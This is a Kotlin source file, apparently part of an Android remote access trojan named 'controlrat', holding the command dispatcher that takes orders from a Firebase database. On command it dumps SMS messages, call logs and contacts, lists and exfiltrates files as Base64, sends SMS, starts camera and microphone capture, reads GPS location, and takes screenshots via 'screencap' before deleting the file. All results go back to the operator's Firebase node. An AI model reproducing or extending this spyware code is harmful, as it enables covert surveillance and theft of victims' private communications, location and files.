package com.controlrat
import android.content.*
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.util.Base64
import android.widget.Toast
import com.google.firebase.database.FirebaseDatabase
import java.io.File

object CommandManager {
    fun execute(ctx: Context, cmd: String, payload: Map<String, Any>, appId: String) {
        val db = FirebaseDatabase.getInstance()
        val outRef = db.getReference("agents/$appId/output")
        try {
            when (cmd) {
                "toast" -> { android.os.Handler(ctx.mainLooper).post { Toast.makeText(ctx, payload["msg"] as? String ?: "", Toast.LENGTH_LONG).show() }; outRef.child("toast").setValue("OK") }
                "vibrate" -> { val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator; if (Build.VERSION.SDK_INT >= 26) v.vibrate(android.os.VibrationEffect.createOneShot(1000, 255)) else @Suppress("DEPRECATION") v.vibrate(1000); outRef.child("vibrate").setValue("OK") }
                "open_url" -> { ctx.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(payload["url"] as? String ?: "")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); outRef.child("url").setValue("Opened") }
                
                "sms_dump" -> {
                    val list = mutableListOf<Map<String,String>>()
                    ctx.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50")?.use { while(it.moveToNext()) list.add(mapOf("from" to it.getString(it.getColumnIndexOrThrow("address")), "body" to it.getString(it.getColumnIndexOrThrow("body")))) }
                    outRef.child("sms").setValue(list)
                }
                "send_sms" -> { SmsManager.getDefault().sendTextMessage(payload["to"] as String, null, payload["body"] as String, null, null); outRef.child("sms_sent").setValue("OK") }
                "call_logs" -> {
                    val list = mutableListOf<Map<String,String>>()
                    ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50")?.use { while(it.moveToNext()) list.add(mapOf("num" to it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)), "type" to it.getString(it.getColumnIndexOrThrow(CallLog.Calls.TYPE)))) }
                    outRef.child("calls").setValue(list)
                }
                "contacts" -> {
                    val list = mutableListOf<String>()
                    ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { while(it.moveToNext()) list.add(it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))) }
                    outRef.child("contacts").setValue(list)
                }
                "file_list" -> {
                    val files = File(payload["path"] as? String ?: "/sdcard").listFiles()?.map { mapOf("name" to it.name, "dir" to it.isDirectory, "size" to it.length()) } ?: emptyList()
                    outRef.child("files").setValue(files)
                }
                "file_download" -> {
                    val f = File(payload["path"] as? String ?: "")
                    if (f.exists()) outRef.child("download_${f.name}").setValue(Base64.encodeToString(f.readBytes(), Base64.NO_WRAP))
                }
                "camera_front" -> ctx.startService(Intent(ctx, CameraService::class.java).putExtra("lens", "front").putExtra("appid", appId))
                "camera_back" -> ctx.startService(Intent(ctx, CameraService::class.java).putExtra("lens", "back").putExtra("appid", appId))
                "mic" -> ctx.startService(Intent(ctx, MicService::class.java).putExtra("appid", appId))
                "gps" -> {
                    val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                    @Suppress("MissingPermission") val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    if (loc != null) outRef.child("gps").setValue(mapOf("lat" to loc.latitude, "lon" to loc.longitude, "maps" to "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"))
                }
                "screenshot" -> {
                    // Trik Screenshot tanpa MediaProjection (Butuh akses storage / root)
                    val process = Runtime.getRuntime().exec("screencap -p /sdcard/screen.png")
                    process.waitFor()
                    val f = File("/sdcard/screen.png")
                    if (f.exists()) {
                         outRef.child("screenshot").setValue(Base64.encodeToString(f.readBytes(), Base64.NO_WRAP))
                         f.delete()
                    }
                }
                else -> outRef.child("error").setValue("Unknown: $cmd")
            }
        } catch (e: Exception) { outRef.child("error").setValue(e.message) }
    }
}
